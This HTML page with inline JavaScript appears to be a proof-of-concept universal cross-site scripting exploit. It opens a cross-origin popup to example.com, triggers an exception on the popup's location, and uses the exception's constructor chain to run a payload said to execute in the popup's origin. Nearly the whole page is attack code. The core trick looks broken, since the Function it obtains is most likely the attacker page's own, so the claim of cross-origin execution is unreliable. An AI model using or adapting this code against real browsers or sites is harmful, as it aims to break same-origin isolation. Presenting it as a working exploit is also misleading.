<body>
<script>
// ==============================
// CONFIG
// ==============================
var TARGET_ORIGIN = "https://example.com"; // Origin berbeda
var DELAY = 1000;

// ==============================
// UTILS
// ==============================
function log(msg) { console.log("[POC] " + msg); }
function safeExec(fn) { try { fn(); } catch(e){ log(e); } }

// ==============================
// STEP 1: OPEN CROSS-ORIGIN POPUP
// ==============================
function openPopup() {
    log("Opening cross-origin popup...");
    var popup = window.open(TARGET_ORIGIN, "_blank", "width=400,height=300");
    if (!popup) {
        alert("Popup blocked!");
        return null;
    }
    return popup;
}

// ==============================
// STEP 2: TRIGGER EXCEPTION TO GET FUNCTION
// ==============================
function triggerUXSS(victim) {
    log("Triggering exception for UXSS...");

    try {
        // Force exception using cross-origin call
        location.assign.call(victim.location);
    } catch (e) {
        log("Exception captured ✔");
        return e;
    }

    log("No exception ❌");
    return null;
}

// ==============================
// STEP 3: EXECUTE PAYLOAD IN POPUP
// ==============================
function executePayload(exceptionObject) {
    log("Executing payload in popup...");

    safeExec(function() {
        var func = exceptionObject.constructor.constructor;

        // Payload: runs inside popup origin
        func(`
            document.body.style.backgroundColor = '#111';
            document.body.style.color = '#0f0';
            document.body.innerHTML = "<h1>UXSS - Cross-Origin Popup!</h1>";
            document.title = "Popup Owned!";
            alert("Popup Origin: " + location.origin);
            console.log("Payload executed in:", location.href);
        `)();
    });
}

// ==============================
// MAIN FLOW
// ==============================
function runPoC() {
    log("Starting cross-origin popup PoC...");

    var popup = openPopup();
    if (!popup) return;

    setTimeout(function() {
        var ex = triggerUXSS(popup);
        if (!ex) return;

        executePayload(ex);

    }, DELAY);
}

// ==============================
// START
// ==============================
runPoC();
</script>

<h2>Check the popup!</h2>
<p>This PoC opens a popup from a different origin and runs a payload in it.</p>
</body>
